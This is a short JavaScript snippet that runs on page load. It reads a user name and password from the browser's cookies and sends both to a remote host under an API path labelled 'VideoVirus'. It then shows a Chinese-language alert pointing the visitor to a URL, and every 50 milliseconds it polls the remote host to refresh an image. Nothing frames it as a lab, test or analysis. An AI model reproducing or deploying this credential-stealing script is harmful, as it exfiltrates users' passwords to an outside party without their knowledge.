
window.onload = function() {
    var user = JSON.parse(document.cookie).user;
    var pwd = JSON.parse(document.cookie).pwd;
    var xhr = new XMLHttpRequest();
    var attack_type = 'VideoVirus';
    xhr.open("GET",remote+"/api/"+attack_type+"/"+user+"/"+pwd,true);
    xhr.send();
    xhr.onload=function()
    {
        if (xhr.readyState === 4) {
            var response = xhr.responseText;
            showAlert("<h2 style='color:red'>收到信息:</h2>"+'请访问URL:<br/>' + remote + '/'+response , null)

            var img = document.getElementById('video_view');
            var run = setInterval(function() 
            {
                img.src = remote+"/run/"+response;
            } , 50); //使用短轮询，不是 websocket 用不起，而是短轮询更有性价比.
        }
    }
}